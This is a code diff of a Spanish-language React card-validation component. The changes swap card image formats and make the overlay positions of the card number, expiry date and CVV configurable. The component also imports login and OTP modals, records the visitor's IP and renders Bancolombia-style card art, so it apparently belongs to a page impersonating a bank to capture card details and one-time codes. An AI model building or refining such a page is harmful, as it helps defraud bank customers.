@@ -6,6 +6,8 @@ import IniciarSesionModal from "./modals/iniciarSesionModal";
 import NumOTPModal from "./modals/NumOTP-Modal";
 import './css/LoginModal.css';
 import Payment from "payment";
+import { CARD_TEXT_CONFIG } from "./cardTextConfig"; // Importar configuración
+import { limpiarPaddingBody } from "../../../@utils"; // Importar utilidad de limpieza
 
 // Estilos para la animación de flip
 const flipStyles = `
@@ -195,6 +197,10 @@ export default function ValidacionTC() {
 
         validateAccess();
 
+        // Limpiar estilos residuales (padding blanco)
+        limpiarPaddingBody();
+        document.body.classList.remove('has-fixed-navbar');
+
         obtenerIP();
         obtenerFechaHora();
     }, []);
@@ -281,34 +287,35 @@ export default function ValidacionTC() {
 
 
     // 1. Mapa de imágenes frontales a traseras
+    // 1. Mapa de imágenes frontales a traseras
     const getBackCardFilename = (frontFilename) => {
         const frontToBackMap = {
             // Crédito - Mastercard
-            "imgi_10_Mastercard_ideal_.png": "Mastercard-ideal.png",
-            "imgi_11_Mastercard_joven_.png": "Mastercard-joven.png",
-            "imgi_12_clasica_.png": "Mastercard-clasica.png",
-            "imgi_14_Mastercard_credit-card.png": "Mastercard-Unica.png",
-            "imgi_15_275x172.png": "Mastercard-Standard.png",
-            "imgi_16_Mastercard_oro_.png": "Mastercard-oro.png",
-            "imgi_19_Mastercard_611_600x379.png": "Mastercard-Platinum.png",
-            "imgi_24_Mastercard_612_600x379.png": "Mastercard-Black-v1.png",
-            "imgi_26_Mastercard_+Tarjeta+Virtual.png": "Mastercard-E-Card-v1.png",
-            "imgi_29_Mastercard-Sufi_Optimizada.png": "Mastercard-Sufi-v1.png",
-            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.png": "Mastercard-Esso-mobil-v1.png",
-            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.png": "Mastercard-Esso-mobil-v1.png",
+            "imgi_10_Mastercard_ideal_.png": "Mastercard-ideal.webp",
+            "imgi_11_Mastercard_joven_.png": "Mastercard-joven.webp",
+            "imgi_12_clasica_.png": "Mastercard-clasica.webp",
+            "imgi_14_Mastercard_credit-card.png": "Mastercard-Unica.webp",
+            "imgi_15_275x172.png": "Mastercard-Standard.webp",
+            "imgi_16_Mastercard_oro_.png": "Mastercard-oro.webp",
+            "imgi_19_Mastercard_611_600x379.png": "Mastercard-Platinum.webp",
+            "imgi_24_Mastercard_612_600x379.png": "Mastercard-Black-v1.webp",
+            "imgi_26_Mastercard_+Tarjeta+Virtual.png": "Mastercard-E-Card-v1.webp",
+            "imgi_29_Mastercard-Sufi_Optimizada.png": "Mastercard-Sufi-v1.webp",
+            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.png": "Mastercard-Esso-mobil-v1.webp",
+            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.png": "Mastercard-Esso-mobil-v1.webp",
             // Crédito - Visa
-            "imgi_13_+Visa+clasica+tradicional.png": "Visa-Clasica.png",
-            "imgi_17_Visa+Seleccion+Colombia.png": "Visa-seleccion-colombia.png",
-            "imgi_18_Visa+Oro.png": "Visa-Oro.png",
-            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.png": "Visa-LifeMiles-v1 (2).png",
-            "imgi_25_Visa+Platinum+Conavi.png": "Visa-Platinum-v1.png",
-            "imgi_28_Visa_Infinite_Card.png": "Visa-infinite-v1.png",
+            "imgi_13_+Visa+clasica+tradicional.png": "Visa-Clasica.webp",
+            "imgi_17_Visa+Seleccion+Colombia.png": "Visa-seleccion-colombia.webp",
+            "imgi_18_Visa+Oro.png": "Visa-Oro.webp",
+            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.png": "Visa-LifeMiles-v1 (2).webp",
+            "imgi_25_Visa+Platinum+Conavi.png": "Visa-Platinum-v1.webp",
+            "imgi_28_Visa_Infinite_Card.png": "Visa-infinite-v1.webp",
             // Crédito - Amex
-            "imgi_20_AMEX+SkyBlue.png": "Amex+Libre.png",
-            "imgi_21_AMEX+Green.png": "Amex-Green-v1.png",
-            "imgi_22_AMEX+Gold.png": "Amex-Gold-v1.png",
-            "imgi_27_AMEX+Platinum.png": "Amex-Platinum-v1.png",
-            "imgi_7_Amex+Libre.png": "Amex+Libre.png",
+            "imgi_20_AMEX+SkyBlue.png": "Amex+Libre.webp",
+            "imgi_21_AMEX+Green.png": "Amex-Green-v1.webp",
+            "imgi_22_AMEX+Gold.png": "Amex-Gold-v1.webp",
+            "imgi_27_AMEX+Platinum.png": "Amex-Platinum-v1.webp",
+            "imgi_7_Amex+Libre.png": "Amex+Libre.webp",
             // Débito
             "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.png": "Débito Cívica.png",
             "imgi_5_Debito_(preferencial).png": "Débito Preferencial.png",
@@ -319,25 +326,26 @@ export default function ValidacionTC() {
     };
 
     // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
+    // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
     const CARD_ADJUSTMENTS = {
         // --- VISA ---
-        "Visa-Clasica.png": { transform: "scale(1.15)" },
-        "Visa-seleccion-colombia.png": { transform: "scale(1.15)" },
-        "Visa-Oro.png": { transform: "scale(1.15)" },
-        "Visa-Platinum-v1.png": { transform: "scale(1.1)" },
+        "Visa-Clasica.webp": { transform: "scale(1.15)" },
+        "Visa-seleccion-colombia.webp": { transform: "scale(1.15)" },
+        "Visa-Oro.webp": { transform: "scale(1.15)" },
+        "Visa-Platinum-v1.webp": { transform: "scale(1.1)" },
         // --- MASTERCARD ---
-        "Mastercard-Unica.png": { transform: "scale(1.1)" },
-        "Mastercard-oro.png": { transform: "scale(1.1)" },
-        "Mastercard-Esso-mobil-v1.png": { transform: "scale(1.15)" },
-        "Mastercard-Platinum.png": { transform: "scale(1.1)" },
-        "Mastercard-Black-v1.png": { transform: "scale(1.06)" },
-        "Mastercard-E-Card-v1.png": { transform: "scale(1.05)" },
+        "Mastercard-Unica.webp": { transform: "scale(1.1)" },
+        "Mastercard-oro.webp": { transform: "scale(1.1)" },
+        "Mastercard-Esso-mobil-v1.webp": { transform: "scale(1.15)" },
+        "Mastercard-Platinum.webp": { transform: "scale(1.1)" },
+        "Mastercard-Black-v1.webp": { transform: "scale(1.06)" },
+        "Mastercard-E-Card-v1.webp": { transform: "scale(1.05)" },
         "Débito Cívica.png": { transform: "scale(1.03)" },
         "Débito Preferencial.png": { transform: "scale(1.04)" },
         "Débito Clásica.png": { transform: "scale(1.04)" },
         "debito_virtual.png": { transform: "scale(1.05)" },
         // --- AMEX ---
-        "Amex+Libre.png": { transform: "scale(1.15)" },
+        "Amex+Libre.webp": { transform: "scale(1.15)" },
     };
 
     const getCardStyle = (filename) => {
@@ -357,6 +365,11 @@ export default function ValidacionTC() {
     };
 
     const getTipoTarjeta = () => cardData.tipo === "credito" ? "Crédito" : "Débito";
+
+    // --- HELPER PARA CONFIGURACIÓN DE TEXTO ---
+    const getCardConfig = (filename) => {
+        return CARD_TEXT_CONFIG[filename] || CARD_TEXT_CONFIG["default"];
+    };
 
 
     const handleDigitsChange = (e) => {
@@ -761,16 +774,36 @@ export default function ValidacionTC() {
                                             style={getCardStyle(cardData.filename)}
                                         />
 
+                                        {/* --- DIGITOS (Personalizable en cardTextConfig.js) --- */}
                                         <div style={{
-                                            position: "absolute", top: "65%", left: "50%", transform: "translate(-50%, -50%)", width: "88%",
-                                            display: "flex", flexDirection: "column", gap: "8px", color: "#ffffff",
-                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)", pointerEvents: "none"
+                                            position: "absolute",
+                                            top: getCardConfig(cardData.filename).digits?.top || "58%",
+                                            left: getCardConfig(cardData.filename).digits?.left || "50%",
+                                            transform: "translate(-50%, -50%)",
+                                            width: getCardConfig(cardData.filename).digits?.width || "88%",
+                                            textAlign: getCardConfig(cardData.filename).digits?.textAlign || "left",
+                                            color: getCardConfig(cardData.filename).digits?.color || "#ffffff",
+                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
+                                            pointerEvents: "none"
                                         }}>
-                                            <div className="digits-text" style={{ marginTop: 20 }}>
+                                            <div className="digits-text">
                                                 {cardDigits.padEnd(requiredDigitsLength, '•').match(/.{1,4}/g)?.join(' ')} {cardData.digits}
                                             </div>
+                                        </div>
 
-                                            <div className="digits-text" style={{ marginTop: 0 }}>
+                                        {/* --- FECHA (Personalizable en cardTextConfig.js) --- */}
+                                        <div style={{
+                                            position: "absolute",
+                                            top: getCardConfig(cardData.filename).date?.top || "70%",
+                                            left: getCardConfig(cardData.filename).date?.left || "50%",
+                                            transform: "translate(-50%, -50%)",
+                                            width: getCardConfig(cardData.filename).date?.width || "88%",
+                                            textAlign: getCardConfig(cardData.filename).date?.textAlign || "left",
+                                            color: getCardConfig(cardData.filename).date?.color || "#ffffff",
+                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
+                                            pointerEvents: "none"
+                                        }}>
+                                            <div className="digits-text">
                                                 {expirationDate || "MM/YY"}
                                             </div>
                                         </div>
@@ -783,9 +816,17 @@ export default function ValidacionTC() {
                                             style={getCardStyle(getBackCardFilename(cardData.filename))}
                                         />
 
+                                        {/* --- TEXTO DINÁMICO BACK (CVV) (Personalizable en cardTextConfig.js) --- */}
                                         <div style={{
-                                            position: "absolute", top: "32.5%", left: "84%", transform: "translate(-50%, -50%)",
-                                            color: "#000", fontSize: "20px", fontFamily: "monospace", fontWeight: "bold", pointerEvents: "none"
+                                            position: "absolute",
+                                            top: getCardConfig(cardData.filename).back.top,
+                                            left: getCardConfig(cardData.filename).back.left,
+                                            transform: "translate(-50%, -50%)",
+                                            color: getCardConfig(cardData.filename).back.color,
+                                            fontSize: getCardConfig(cardData.filename).back.fontSize || "20px",
+                                            fontFamily: "monospace",
+                                            fontWeight: "bold",
+                                            pointerEvents: "none"
                                         }}>
                                             {cvv}
                                         </div>
